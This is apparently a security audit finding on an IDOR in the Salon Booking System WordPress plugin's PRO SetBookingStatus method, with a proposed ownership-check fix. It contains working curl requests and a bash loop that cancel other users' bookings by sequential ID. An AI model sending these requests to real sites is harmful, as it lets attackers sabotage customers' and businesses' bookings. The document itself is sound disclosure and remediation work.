# SetBookingStatus IDOR Vulnerability - Critical Finding

## Key Discovery: PRO Version Only

**Line 14-16 of SetBookingStatus.php:**
```php
if (!defined("SLN_VERSION_PAY")) {
    return array();  // Does nothing in free version
}
```

**This means:**
- ✅ FREE version: Not vulnerable (function does nothing)
- ❌ PRO version: VULNERABLE (no ownership check)

---

## Side-by-Side Comparison

### ✅ CancelBooking.php (SECURE)

```php
$booking = $plugin->createBooking(intval($_POST['id']));

// LINE 18: OWNERSHIP CHECK
$available = $booking->getUserId() == get_current_user_id();

// LINE 22: Validates ownership before allowing cancel
if ($cancellationEnabled && !$outOfTime && $available) {
    $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
} elseif (!$available) {
    // LINE 27: Returns error if not owner
    $this->addError(__("You don't have access", 'salon-booking-system'));
}
```

**Protection:** ✅ YES
1. Checks `$booking->getUserId() == get_current_user_id()`
2. Only cancels if ownership verified
3. Returns error message if unauthorized

---

### ❌ SetBookingStatus.php (VULNERABLE)

```php
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// NO OWNERSHIP CHECK!

// Allows changing status to CONFIRMED or CANCELED
if (in_array($_POST['status'], array(SLN_Enum_BookingStatus::CONFIRMED,
                                      SLN_Enum_BookingStatus::CANCELED))) {
    $booking->setStatus(wp_unslash($_POST['status']));
}

return array('success' => 1, 'status' => $statusLabel);
```

**Protection:** ❌ NO
1. No check for `$booking->getUserId()`
2. No check for admin capability
3. Any logged-in user can modify any booking

---

## Attack Demonstration

### Using CancelBooking (Blocked by Ownership Check)

```bash
# User B tries to cancel User A's booking #100
curl -X POST 'http://site.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_userB...' \
  --data 'action=salon&method=CancelBooking&id=100'

# Response: {"errors": ["You don't have access"]}
# ✅ BLOCKED by ownership check on line 18
```

### Using SetBookingStatus (IDOR Vulnerability)

```bash
# User B changes User A's booking #100 to canceled
curl -X POST 'http://site.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_userB...' \
  --data 'action=salon&method=SetBookingStatus&booking_id=100&status=sln-b-canceled'

# Response: {"success": 1, "status": "..."}
# ❌ SUCCEEDS - No ownership check!
```

---

## Why CancelBooking is Secure

```php
// Line 18: Creates ownership check variable
$available = $booking->getUserId() == get_current_user_id();

// Line 22: THREE conditions must be met:
if ($cancellationEnabled &&    // 1. Cancellation enabled in settings
    !$outOfTime &&             // 2. Not past cancellation deadline  
    $available) {              // 3. User owns the booking ✓
    $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
}

// Lines 27-28: Explicit error handling
elseif (!$available) {
    $this->addError(__("You don't have access"));
}
```

**Developer clearly understood security here!**

---

## Why SetBookingStatus is Vulnerable

```php
// Line 10: Only checks if ANY user is logged in
if (!is_user_logged_in()) {
    return array('redirect' => wp_login_url());
}

// Line 22: Fetches ANY booking by ID
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// Line 24: Changes status with NO authorization
if (in_array($_POST['status'], array(...))) {
    $booking->setStatus(wp_unslash($_POST['status']));
}
```

**Missing the ownership check pattern from CancelBooking!**

---

## Evidence of Intent

The existence of CancelBooking with proper ownership checks proves:

1. **Developers knew how to implement ownership checks**
2. **The pattern exists in the codebase**
3. **SetBookingStatus is missing this pattern** (likely oversight)

This suggests SetBookingStatus is a **security regression** or was developed by a different developer who didn't follow the security pattern.

---

## Exploitation Scenario

**Attacker Goal:** Cancel competitor's bookings

**Using CancelBooking (Secure):**
```bash
for id in {1..100}; do
  curl --data "action=salon&method=CancelBooking&id=$id"
done
# Result: All requests fail with "You don't have access" ✅
```

**Using SetBookingStatus (Vulnerable):**
```bash
for id in {1..100}; do
  curl --data "action=salon&method=SetBookingStatus&booking_id=$id&status=sln-b-canceled"
done
# Result: All bookings canceled! ❌
```

---

## Why This Confirms IDOR

1. ✅ **Sequential IDs** - WordPress post IDs (1, 2, 3...)
2. ✅ **IDs exposed to users** - Shown in "My Account" page
3. ✅ **No ownership validation** - Confirmed by code comparison
4. ✅ **Functional exploit** - Can actually cancel other users' bookings
5. ✅ **Only requires login** - Any user account (not admin)

**Severity: CRITICAL**
**Exploitability: TRIVIAL**
**Affected: PRO version only**

---

## Recommended Fix

Add the same ownership check pattern from CancelBooking:

```php
public function execute()
{
    if (!is_user_logged_in()) {
        return array('redirect' => wp_login_url());
    }

    if (!defined("SLN_VERSION_PAY")) {
        return array();
    }

    $booking = $plugin->createBooking(intval($_POST['booking_id']));

    // ✅ ADD OWNERSHIP CHECK (same pattern as CancelBooking)
    $available = $booking->getUserId() == get_current_user_id();
    
    // ✅ ADD ADMIN CAPABILITY CHECK (for admin use cases)
    $isAdmin = current_user_can('manage_salon');

    // ✅ REQUIRE OWNERSHIP OR ADMIN
    if (!$available && !$isAdmin) {
        return array('error' => 'You don\'t have access', 'success' => 0);
    }

    // Rest of code...
    if (in_array($_POST['status'], array(...))) {
        $booking->setStatus(wp_unslash($_POST['status']));
    }

    return array('success' => 1, 'status' => $statusLabel);
}
```

---

## Conclusion

**CancelBooking:** ✅ Properly secured with ownership checks
**SetBookingStatus:** ❌ Missing ownership checks (IDOR vulnerability)

**The IDOR is CONFIRMED and EXPLOITABLE in the PRO version.**
